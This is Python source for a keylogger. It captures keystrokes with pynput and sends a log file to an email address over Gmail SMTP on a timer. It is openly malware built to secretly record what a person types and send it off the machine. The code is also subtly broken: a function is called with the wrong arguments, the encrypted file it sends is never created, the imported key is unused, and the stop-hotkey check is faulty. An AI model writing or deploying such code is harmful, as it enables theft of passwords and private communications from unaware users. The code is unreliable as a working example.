
# Imports packages that are being used in the code
from config import EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_INTERVAL, ENCRYPTION_KEY
from pynput import keyboard
from cryptography.fernet import Fernet
import smtplib
from email.message import EmailMessage
import threading
import time

# Import for dotenv for email creds
from dotenv import load_dotenv
import os

load_dotenv()

# Store logs in memory
log = ''

# Keys currently pressed
pressed_keys = set()
listener = None # will hold refernce to listener

def send_encrypted_log_file():
    with open("keylog.enc", "rb") as f:
        data = f.read()

    msg = EmailMessage()
    msg['Subject'] = 'Encrypted Keylog File'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg.set_content("Attached encrypted keystrokes.")

    msg.add_attachment(data, maintype='application', subtype='octet-stream', filename="keylog.enc")

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

def update_log(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += ' '
        else:
            log += f' [{key}]'

def reset_log():
    global log
    log = ''

def report_loop():
    while True:
        if log:
            send_encrypted_log_file(log)
            reset_log()
        time.sleep(SEND_INTERVAL)

threading.Thread(target=report_loop, daemon=True).start()

def stop_keylogger():
    print('[!] Stop hotkey detected. Exiting...')
    if listener:
        listener.stop()

def on_press(key):
    pressed_keys.add(key)
    update_log(key)

    # Check for Alt + X
    if keyboard.Key.alt_l or keyboard.Key.alt_r in pressed_keys:
        if key == keyboard.KeyCode.from_char('x'):
            stop_keylogger()

def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

# Save file for log debugging
def save_to_file():
    with open("keylog.txt", "a") as f:
        f.write(log + "\n")

# Start keylogger and reporting
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
report_loop()

# Keep running
listener.join()